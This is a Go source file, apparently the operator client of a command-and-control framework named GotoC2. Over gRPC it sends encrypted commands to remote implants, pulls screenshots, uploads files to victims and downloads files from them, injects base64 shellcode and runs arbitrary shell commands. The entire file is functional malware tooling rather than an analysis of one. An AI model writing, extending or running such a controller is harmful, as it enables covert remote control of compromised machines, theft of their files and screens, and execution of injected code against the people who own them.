package main

import (
	"GotoC2/grpcapi"
	"GotoC2/util"
	"bufio"
	"context"
	"flag"
	"fmt"
	"google.golang.org/grpc"
	"log"
	"os"
	"strconv"
	"strings"
)

func main() {
	util.Banner()
	var (
		opts            []grpc.DialOption
		conn            *grpc.ClientConn
		err             error
		client          grpcapi.AdminClient
		session, ip     string
		sleepTime, port int
	)

	// name是参数名称，value默认值，usage描述信息
	flag.IntVar(&sleepTime, "sleep", 0, "sleep time")
	flag.StringVar(&session, "session", "", "start session")
	flag.StringVar(&ip, "ip", "127.0.0.1", "Server IP")
	flag.IntVar(&port, "port", 1962, "AdminServer port")
	flag.Parse()

	//withinsecure忽略证书
	opts = append(opts, grpc.WithInsecure())
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024*1024*12)))
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024*1024*12)))
	if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port), opts...); err != nil {
		log.Fatal(err)
	}

	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	if sleepTime != 0 {
		var time = new(grpcapi.SleepTime)
		time.Time = int32(sleepTime)
		ctx := context.Background()
		client.SetSleepTime(ctx, time)
	}

	if session != "" {
		if session == "start" {
			fmt.Println("start exec:")
			for {
				var cmd = new(grpcapi.Command)
				reader := bufio.NewReader(os.Stdin)
				command, _, err := reader.ReadLine()
				if err != nil {
					fmt.Println("reader.readline()error", err)
				}
				flags := strings.Split(string(command), " ")
				if flags[0] == "exit" {
					return
				}
				if flags[0] == "screenshot" {
					cmd = Run(cmd, command, client)
					images := strings.Split(cmd.Out, ";")
					for i, j := range images {
						if j == "" {
							break
						}
						image, err := util.DecryptByAes(j)
						if err != nil {
							log.Fatal(err.Error())
						}
						fileName := strconv.Itoa(i) + ".png"
						err = os.WriteFile(fileName, image, 0666)
						if err != nil {
							fmt.Println("截图保存失败")
						} else {
							fmt.Println("截图保存成功")
						}
					}
					continue
				}
				if flags[0] == "upload" {
					if len(flags) != 3 || flags[2] == "" {
						fmt.Println("输入格式为：upload 本地文件 目标文件")
						continue
					}
					file, err := os.ReadFile(flags[1])
					if err != nil {
						fmt.Println(err.Error())
					}
					cmd.Out, err = util.EncryptByAes(file)
					if err != nil {
						log.Fatal(err.Error())
					}
					cmd = Run(cmd, command, client)
					out, err := util.DecryptByAes(cmd.Out)
					if err != nil {
						log.Fatal(err.Error())
					}
					fmt.Println(string(out))
					continue
				}
				if flags[0] == "download" {
					if len(flags) != 3 || flags[2] == "" {
						fmt.Println("输入格式为：download 目标文件 本地文件")
						continue
					}
					cmd = Run(cmd, command, client)
					file, err := util.DecryptByAes(cmd.Out)
					if err != nil {
						log.Fatal(err.Error())
					}
					if string(file[0:13]) == "download err!" {
						fmt.Println(string(file[0:13]))
						continue
					}
					err = os.WriteFile(flags[2], file, 0666)
					if err != nil {
						fmt.Println(err.Error())
					} else {
						fmt.Println("download success! Path:" + flags[2])
					}
					continue
				}
				if flags[0] == "gotocs" {
					if len(flags) != 2 || flags[1] == "" {
						fmt.Println("输入格式为：gotocs shellcode的base64字符串")
						continue
					}
					cmd = Run(cmd, command, client)
					out, err := util.DecryptByAes(cmd.Out)
					if err != nil {
						fmt.Println(err.Error())
					}
					fmt.Println(out)
				}

				cmd = Run(cmd, command, client)
				out, err := util.DecryptByAes(cmd.Out)
				if err != nil {
					log.Fatal(err.Error())
				}
				cmd.Out = util.ConvertByte2String(out, util.GB18030)
				fmt.Println(cmd.Out)
			}
		}
	}
}

func Run(cmd *grpcapi.Command, command []byte, client grpcapi.AdminClient) *grpcapi.Command {
	var err error
	cmd.In, _ = util.EncryptByAes(command)
	// context.Background()是用于创建一个空的、非nil的Context对象的函数
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd)
	if err != nil {
		log.Fatal("client" + err.Error())
	}
	return cmd
}
